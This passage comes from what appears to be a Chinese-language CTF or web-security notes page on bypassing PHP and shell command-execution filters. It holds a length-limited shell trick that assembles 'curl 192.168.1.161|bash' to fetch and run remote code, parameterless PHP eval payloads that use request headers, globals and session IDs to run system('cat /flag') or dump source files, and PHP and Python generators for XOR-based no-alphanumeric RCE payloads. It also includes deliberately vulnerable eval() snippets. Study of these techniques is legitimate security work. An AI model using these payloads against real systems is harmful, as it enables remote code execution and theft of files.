<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># 构造 curl 192.168.1.161|bash</span>
</span></span><span style="display:flex;"><span>&gt;bash
</span></span><span style="display:flex;"><span>&gt;<span style="color:#ae81ff">\|\\</span>
</span></span><span style="display:flex;"><span>&gt;61<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;1<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;1.<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;68<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;2.<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;19<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;<span style="color:#ae81ff">\ \\</span>
</span></span><span style="display:flex;"><span>&gt;rl<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;cu<span style="color:#ae81ff">\\</span>
</span></span></code></pre></div><h4 id="3-执行脚本">
  3. 执行脚本
  <a class="anchor" href="#3-%e6%89%a7%e8%a1%8c%e8%84%9a%e6%9c%ac">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sh _
</span></span><span style="display:flex;"><span>sh y
</span></span></code></pre></div><h3 id="长度限制为-4-的绕过">
  长度限制为 4 的绕过
  <a class="anchor" href="#%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6%e4%b8%ba-4-%e7%9a%84%e7%bb%95%e8%bf%87">#</a>
</h3>
<h4 id="前置知识">
  前置知识
  <a class="anchor" href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86">#</a>
</h4>
<ul>
<li><code>ls&gt;&gt;_</code>: 不再适用</li>
<li><code>*</code>：相当于$(dir *)，如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入</li>
</ul>
<h4 id="1-构造-ls--tg">
  1. 构造 ls -t&gt;g
  <a class="anchor" href="#1-%e6%9e%84%e9%80%a0-ls--tg">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;g<span style="color:#ae81ff">\&gt;</span> <span style="color:#75715e"># &#34;g&gt;&#34;</span>
</span></span><span style="display:flex;"><span>&gt;ht- <span style="color:#75715e"># &#34;ht-&#34; 使文件名排列为&#34;g&gt; ht- sl&#34;</span>
</span></span><span style="display:flex;"><span>&gt;sl <span style="color:#75715e"># &#34;sl&#34;</span>
</span></span><span style="display:flex;"><span>&gt;dir
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls: dir &#39;g&gt;&#39; ht- sl</span>
</span></span><span style="display:flex;"><span>*&gt;v <span style="color:#75715e"># 执行 dir 命令，将结果写入 v 文件</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat v: g&gt; ht- sl</span>
</span></span><span style="display:flex;"><span>&gt;rev
</span></span><span style="display:flex;"><span>*v&gt;x <span style="color:#75715e"># *v 相当于 rev 命令，将结果写入 x 文件</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat x: ls -th &gt;g</span>
</span></span></code></pre></div><h4 id="2--分解命令创建文件">
  2.  分解命令，创建文件
  <a class="anchor" href="#2--%e5%88%86%e8%a7%a3%e5%91%bd%e4%bb%a4%e5%88%9b%e5%bb%ba%e6%96%87%e4%bb%b6">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># 构造 curl 192.168.1.161|bash，但是 ip 用 16 进制表示：curl 0xc0a801a1|bash，因为&#34;.&#34;不方便处理</span>
</span></span><span style="display:flex;"><span>&gt;ash
</span></span><span style="display:flex;"><span>&gt;b<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;<span style="color:#ae81ff">\|\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;A1<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;01<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;A8<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;C0<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;0x<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;rl<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>&gt;cu<span style="color:#ae81ff">\
</span></span></span></code></pre></div><h4 id="3--执行脚本">
  3.  执行脚本
  <a class="anchor" href="#3--%e6%89%a7%e8%a1%8c%e8%84%9a%e6%9c%ac">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sh x
</span></span><span style="display:flex;"><span>sh g
</span></span></code></pre></div><h2 id="无参数">
  无参数
  <a class="anchor" href="#%e6%97%a0%e5%8f%82%e6%95%b0">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#39;;&#39;</span><span style="color:#f92672">===</span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^\W]+\((?R)?\)/&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$_GET[<span style="color:#e6db74">&#39;code&#39;</span>])){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>如果是字母、数字、下划线+();，如 a();，则替换后为&rdquo;;&quot;，判断为 true，括号内不能带内容，否则匹配不到，不能替换为空，判断为 false</li>
<li>?R 表示递归匹配，即匹配 a(b(c()));</li>
</ul>
<h3 id="常见函数解释">
  常见函数解释
  <a class="anchor" href="#%e5%b8%b8%e8%a7%81%e5%87%bd%e6%95%b0%e8%a7%a3%e9%87%8a">#</a>
</h3>
<ul>
<li>
<p><code>print_r(?)</code>: 打印变量</p>
</li>
<li>
<p><code>eval(string)</code>: 执行字符串中的 PHP 代码</p>
</li>
<li>
<p><code>pos(array)</code>: 返回数组第一个的值</p>
</li>
<li>
<p><code>end(array)</code>: 返回数组最后一个的值</p>
</li>
<li>
<p><code>next(array)</code>: 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位</p>
</li>
<li>
<p><code>session_start()</code>: 启动或重用会话，成功返回 true，失败返回 false</p>
</li>
<li>
<p><code>session_id(session)</code>: 获取会话 ID</p>
</li>
<li>
<p><code>show_source(file)</code>: 显示文件的源码</p>
</li>
</ul>
<h2 id="无参数命令执行请求头绕过">
  无参数命令执行请求头绕过
  <a class="anchor" href="#%e6%97%a0%e5%8f%82%e6%95%b0%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e8%af%b7%e6%b1%82%e5%a4%b4%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="请求头-rce">
  请求头 RCE
  <a class="anchor" href="#%e8%af%b7%e6%b1%82%e5%a4%b4-rce">#</a>
</h3>
<h4 id="http-请求标头php73">
  HTTP 请求标头（php7.3）
  <a class="anchor" href="#http-%e8%af%b7%e6%b1%82%e6%a0%87%e5%a4%b4php73">#</a>
</h4>
<p><code>getallheaders()</code>: 获取所有的 HTTP 请求标头，显示顺序是和发送的顺序相反的</p>
<p><code>apache_request_headers()</code></p>
<h5 id="exp利用请求头进行-rce">
  exp：利用请求头进行 RCE
  <a class="anchor" href="#exp%e5%88%a9%e7%94%a8%e8%af%b7%e6%b1%82%e5%a4%b4%e8%bf%9b%e8%a1%8c-rce">#</a>
</h5>
<p>抓包，在请求头中添加最后一行（或者修改最后一行）：<code>flag: system('cat /flag')</code>;</p>
<p><code>?code=eval(pos(getallheaders()));</code></p>
<h4 id="利用全局变量进行-rcephp57">
  利用全局变量进行 RCE（php5/7）
  <a class="anchor" href="#%e5%88%a9%e7%94%a8%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e8%bf%9b%e8%a1%8c-rcephp57">#</a>
</h4>
<p><code>get_defined_vars()</code>: 返回所有已定义变量的数组
返回数组顺序为 GET-&gt;POST-&gt;COOKIE-&gt;SERVER-&gt;ENV-&gt;FILES-&gt;REQUEST-&gt;GLOBALS</p>
<h5 id="exp利用全局变量进行-rce">
  exp：利用全局变量进行 RCE
  <a class="anchor" href="#exp%e5%88%a9%e7%94%a8%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f%e8%bf%9b%e8%a1%8c-rce">#</a>
</h5>
<p><code>?code=eval(end(pos(get_defined_vars())));&amp;cmd=system('id');</code></p>
<p><code>?code=eval(system(key(pos(get_defined_vars()))));&amp;cat${IFS}/flag=1;</code></p>
<h4 id="利用-sessionphp5">
  利用 session（php5）
  <a class="anchor" href="#%e5%88%a9%e7%94%a8-sessionphp5">#</a>
</h4>
<h5 id="exp1">
  exp1
  <a class="anchor" href="#exp1">#</a>
</h5>
<p>将 PHPSESSID 改为<code>./flag</code></p>
<p><code>?code=show_source(session_id(session_start()));</code></p>
<p>即可读取 flag 文件</p>
<h5 id="exp2">
  exp2
  <a class="anchor" href="#exp2">#</a>
</h5>
<p>使用<code>eval()</code>
PHPSESSID 改为<code>phpinfo();</code>
无法直接执行，需要先把命令转成 16 进制写入 PHPSSID
再是使用<code>hex2bin()</code>函数转换成二进制数，用 eval 执行</p>
<p><code>?code=eval(hex2bin(session_id(session_start())));</code></p>
<h4 id="使用-scandir-进行文件读取">
  使用 scandir() 进行文件读取
  <a class="anchor" href="#%e4%bd%bf%e7%94%a8-scandir-%e8%bf%9b%e8%a1%8c%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96">#</a>
</h4>
<h5 id="函数">
  函数
  <a class="anchor" href="#%e5%87%bd%e6%95%b0">#</a>
</h5>
<ul>
<li><code>scandir(dir)</code>: 返回一个包含有指定路径中的文件和目录的数组</li>
<li><code>getcwd()</code>: 返回当前工作目录</li>
<li><code>chdir(dir)</code>: 改变当前工作目录</li>
<li><code>current(array)</code>: 返回数组中的当前元素的值（第一个）</li>
<li><code>next(array)</code>: 返回数组中当前指针指向的下一个元素的值，并将指针向后移动一位</li>
<li><code>array_reverse(array)</code>: 返回一个单元顺序相反的数组</li>
<li><code>array_flip(array)</code>: 交换数组中的键和值</li>
<li><code>array_rand(array)</code>: 从数组中随机取出一个或多个单元</li>
<li><code>strrev(string)</code>: 反转字符串</li>
<li><code>crypt(string)</code>: 单向加密字符串</li>
<li><code>hebrevc(string)</code>: 将希伯来文本从右往左转换为从左往右</li>
<li><code>localeconv()</code>: 可以输出一个第一项为&quot;.&ldquo;的数组</li>
<li><code>dirname(path)</code>: 返回路径中的目录部分（去掉路径中的最后一个文件名或目录）</li>
</ul>
<h5 id="exp使用-localeconv读取当前目录的文件">
  exp：使用 localeconv()（.）读取当前目录的文件
  <a class="anchor" href="#exp%e4%bd%bf%e7%94%a8-localeconv%e8%af%bb%e5%8f%96%e5%bd%93%e5%89%8d%e7%9b%ae%e5%bd%95%e7%9a%84%e6%96%87%e4%bb%b6">#</a>
</h5>
<p>列出当前目录下的文件</p>
<p><code>?code=print_r(scandir(current(localeconv())));</code></p>
<p>假设目录结构如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>..
</span></span><span style="display:flex;"><span>1.php
</span></span><span style="display:flex;"><span>flag.php
</span></span></code></pre></div><p>反转目录</p>
<p><code>?code=print_r(array_reverse(scandir(current(localeconv()))));</code></p>
<p>读取目录的最后一个（反转后的第一个）</p>
<p><code>?code=show_source(current(array_reverse(scandir(current(localeconv())))));</code></p>
<h5 id="exp使用-getcwd-读取本级或上级目录的文件">
  exp：使用 getcwd() 读取本级或上级目录的文件
  <a class="anchor" href="#exp%e4%bd%bf%e7%94%a8-getcwd-%e8%af%bb%e5%8f%96%e6%9c%ac%e7%ba%a7%e6%88%96%e4%b8%8a%e7%ba%a7%e7%9b%ae%e5%bd%95%e7%9a%84%e6%96%87%e4%bb%b6">#</a>
</h5>
<p>列出当前目录下的文件</p>
<p><code>?code=print_r(scandir(getcwd()));</code></p>
<p>列出上级目录下的文件</p>
<p><code>?code=print_r(scandir(dirname(getcwd())));</code></p>
<p>读取上级目录的最后一个</p>
<p><code>?code=show_source(current(array_reverse(scandir(chdir(dirname(getcwd()))))));</code></p>
<p>随机读取上级目录任意文件（array_flip）</p>
<p><code>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code>
👇
getcwd() 获取当前工作目录。
dirname(getcwd()) 获取当前工作目录的父目录。
chdir(dirname(getcwd())) 将当前工作目录更改为其父目录。
scandir(dirname(chdir(dirname(getcwd())))) 读取新的工作目录（即原来的父目录）下的所有文件和目录。
array_flip(scandir(dirname(chdir(dirname(getcwd()))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))) 显示所选文件的源代码。</p>
<p><code>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</code>
👇
getcwd() 获取当前工作目录。
scandir(getcwd()) 读取当前工作目录下的所有文件和目录。
next(scandir(getcwd())) 获取当前工作目录下的下一个文件或目录。
chdir(next(scandir(getcwd()))) 将当前工作目录更改为下一个文件或目录。
crypt(chdir(next(scandir(getcwd())))) 对新的工作目录进行哈希加密。
hebrevc(crypt(chdir(next(scandir(getcwd()))))) 将加密后的字符串进行反转。
ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。
array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd()))))))))))) 显示所选文件的源代码。</p>
<p><code>?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</code></p>
<p>phpversion() 获取当前 PHP 的版本号。
crypt(phpversion()) 对 PHP 版本号进行哈希加密。
hebrevc(crypt(phpversion())) 将加密后的字符串进行反转。
ord(hebrevc(crypt(phpversion()))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(phpversion())))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(phpversion()))))) 试图读取由 ASCII 值表示的目录下的所有文件和目录。
next(scandir(chr(ord(hebrevc(crypt(phpversion())))))) 获取当前工作目录下的下一个文件或目录。
chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))) 将当前工作目录更改为下一个文件或目录。
crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))) 对新的工作目录进行哈希加密。
hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))) 将加密后的字符串进行反转。
ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))) 获取反转后的字符串的第一个字符的 ASCII 值。
chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))) 将 ASCII 值转换回字符。
scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))) 读取由 ASCII 值表示的目录下的所有文件和目录。
array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))) 将文件和目录的数组反转，使得文件和目录名成为数组的键。
array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))) 从键（即文件和目录名）中随机选择一个。
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))) 显示所选文件的源代码。</p>
<h5 id="exp使用-array-读取根目录">
  exp：使用 array() 读取根目录
  <a class="anchor" href="#exp%e4%bd%bf%e7%94%a8-array-%e8%af%bb%e5%8f%96%e6%a0%b9%e7%9b%ae%e5%bd%95">#</a>
</h5>
<p><code>?code=print_r(serialize(array()));</code>
👇
a:0:{}</p>
<p><code>?code=print_r(crypt(serialize(array())));</code>
随机加密，有几率结尾会有&rdquo;/&quot;👇
$1$kQp4VPZo$.cwWophFa8mHwHf4etyWP/</p>
<p>将结果反转
<code>?code=print_r(strrev(crypt(serialize(array()))));</code>
👇
/n9RZqndDIdPVfDBo62HOT$EiorHvqj$1$</p>
<p>取第一位（利用 ord() 只能取第一位的特性）
<code>?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));</code>
👇
/</p>
<p>列出根目录下的文件
<code>?code=print_r(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))));</code></p>
<p>随机读取某个文件
<code>?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));</code></p>
<h2 id="无字母数字绕过">
  无字母数字绕过
  <a class="anchor" href="#%e6%97%a0%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97%e7%bb%95%e8%bf%87">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-z0-9]/is&#39;</span>,$_GET[<span style="color:#e6db74">&#39;code&#39;</span>])){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="异或运算绕过">
  异或运算绕过
  <a class="anchor" href="#%e5%bc%82%e6%88%96%e8%bf%90%e7%ae%97%e7%bb%95%e8%bf%87">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 生成所有可见字符的异或构造结果
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*author yu22x*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;xor_rce.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>$contents <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>) {
</span></span><span style="display:flex;"><span>            $hex_i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($i);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $hex_i <span style="color:#f92672">=</span> <span style="color:#a6e22e">dechex</span>($i);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>) {
</span></span><span style="display:flex;"><span>            $hex_j <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">dechex</span>($j);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $hex_j <span style="color:#f92672">=</span> <span style="color:#a6e22e">dechex</span>($j);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $preg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/[a-z0-9]/i&#39;</span>; <span style="color:#75715e">//根据题目给的正则表达式修改即可
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($preg, <span style="color:#a6e22e">hex2bin</span>($hex_i)) <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>($preg, <span style="color:#a6e22e">hex2bin</span>($hex_j))) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">.</span> $hex_i;
</span></span><span style="display:flex;"><span>            $b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">.</span> $hex_j;
</span></span><span style="display:flex;"><span>            $c <span style="color:#f92672">=</span> (<span style="color:#a6e22e">urldecode</span>($a) <span style="color:#f92672">^</span> <span style="color:#a6e22e">urldecode</span>($b));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ord</span>($c) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">ord</span>($c) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">126</span>) {
</span></span><span style="display:flex;"><span>                $contents <span style="color:#f92672">=</span> $contents <span style="color:#f92672">.</span> $c <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $a <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">.</span> $b <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>($myfile, $contents);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($myfile);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 构造 payload</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># author yu22x</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">action</span>(arg):
</span></span><span style="display:flex;"><span>    s1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    s2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> arg:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;xor_rce.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> t[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> i:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># print(i)</span>
</span></span><span style="display:flex;"><span>                s1 <span style="color:#f92672">+=</span> t[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span>                s2 <span style="color:#f92672">+=</span> t[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">9</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(&#34;&#39;</span> <span style="color:#f92672">+</span> s1 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;^&#34;&#39;</span> <span style="color:#f92672">+</span> s2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    param <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>        action(input(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] your function：&#34;</span>)) <span style="color:#f92672">+</span> action(input(<span style="color:#e6db74">&#34;[+] your command：&#34;</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;;&#34;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    print(param)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># 运行结果</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> your <span style="color:#66d9ef">function</span>：system
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> your command：ls
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%08%02%08%08%05%0d&#34;</span>^<span style="color:#e6db74">&#34;%7b%7b%7b%7c%60%60&#34;</span><span style="color:#f92672">)(</span><span style="color:#e6db74">&#34;%0c%08&#34;</span>^<span style="color:#e6db74">&#34;%60%7b&#34;</span><span style="color:#f92672">)</span>;
</span></span></code></pre></div><h3 id="或运算绕过">
  或运算绕过
  <a class="anchor" href="#%e6%88%96%e8%bf%90%e7%ae%97%e7%bb%95%e8%bf%87">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
